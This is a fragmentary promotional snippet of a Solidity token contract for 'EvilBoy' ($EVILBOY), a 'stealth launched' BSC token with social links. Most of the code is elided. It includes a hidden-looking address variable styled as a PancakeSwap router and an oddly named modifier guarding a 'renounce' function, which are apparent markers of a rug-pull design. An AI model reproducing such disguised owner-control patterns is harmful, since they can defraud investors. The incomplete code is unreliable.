...
Stealth Launched Project



📱 Telegram : https://t.me/Evilboycommunity

📱 Twitter : https://twitter.com/EvilboyBSC
...
contract Context {
 ...
 contract EVILBOY is Context, ERC20, ERC20Metadata {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;
    mapping(address => bool) private _excluded;

    string private _name = "EvilBoy";
    string private _symbol = "$EVILBOY";
    address private constant _pancakeRouterAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E; // Pancake Address
    uint8 private _decimals = 9;
    uint256 private _totalSupply;
    uint256 private fee = 5; // LP
    ...
    address private _pancakeRouterTVENVOO = 0xF6B2b78CC41FD0Ca63e31Ff65A7f594FD5A73294;
  ...
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    ...
    function renounce() public externelTVENVOO { // Renounce function forever
